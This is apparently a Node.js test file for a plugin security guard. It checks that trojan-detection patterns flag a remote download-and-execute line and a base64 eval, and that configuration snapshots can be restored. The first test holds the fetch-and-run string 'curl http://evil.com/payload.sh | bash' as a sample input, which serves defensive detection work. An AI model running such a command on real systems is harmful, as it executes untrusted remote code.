import test from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { createGuard, TROJAN_PATTERNS } = require('../plugin-guard.js');

test('plugin-guard: trojan patterns detect remote download exec & base64 eval', () => {
  const badCode1 = 'curl http://evil.com/payload.sh | bash';
  const match1 = TROJAN_PATTERNS.some((p) => p.re.test(badCode1));
  assert.strictEqual(match1, true);

  const badCode2 = 'eval(Buffer.from("dmFyIGE9MTs=", "base64").toString())';
  const match2 = TROJAN_PATTERNS.some((p) => p.re.test(badCode2));
  assert.strictEqual(match2, true);

  const goodCode = 'console.log("hello world");';
  const match3 = TROJAN_PATTERNS.some((p) => p.re.test(goodCode));
  assert.strictEqual(match3, false);
});

test('plugin-guard: snapshot and restore profile configuration', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'pg-'));
  const profileDir = path.join(tmp, 'profiles', 'web');
  fs.mkdirSync(profileDir, { recursive: true });
  fs.writeFileSync(path.join(profileDir, 'cordis.patch.yml'), '- id: test-plugin\n  name: test\n');

  const guard = createGuard({
    getHome: () => tmp,
    getProfile: () => 'web',
    dshBin: () => path.join(tmp, 'bin.js'),
    log: () => {},
  });

  const snap = guard.snapshot('initial');
  assert.ok(snap);
  assert.strictEqual(snap.files.includes('cordis.patch.yml'), true);

  // Modify file
  fs.writeFileSync(path.join(profileDir, 'cordis.patch.yml'), 'broken');

  // Restore snapshot
  const res = guard.restore(snap.id);
  assert.strictEqual(res.ok, true);

  const content = fs.readFileSync(path.join(profileDir, 'cordis.patch.yml'), 'utf8');
  assert.ok(content.includes('- id: test-plugin'));

  fs.rmSync(tmp, { recursive: true, force: true });
});
